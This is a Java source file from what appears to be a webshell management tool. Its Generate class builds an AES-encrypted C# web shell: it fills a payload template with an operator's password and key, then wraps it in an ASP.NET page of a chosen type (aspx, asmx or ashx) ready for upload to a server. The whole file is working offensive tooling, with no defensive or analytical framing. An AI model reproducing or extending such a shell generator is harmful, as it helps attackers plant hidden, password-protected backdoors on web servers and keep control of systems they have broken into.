package vip.youwe.shell.shells.cryptions.csharpAes;

import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.functions;

import javax.swing.*;
import java.io.InputStream;

class Generate {

    private static final String[] SUFFIX = {"aspx", "asmx", "ashx"};

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw.bin" : "base64.bin"));
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            Object selectedValue = JOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, SUFFIX, null);
            if (selectedValue != null) {
                String suffix = (String) selectedValue;
                inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
                String template = new String(functions.readInputStream(inputStream));
                inputStream.close();
                template = template.replace("{code}", code);
                data = template.getBytes();
            }

        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }


    public static void main(String[] args) {
        System.out.println();
    }
}
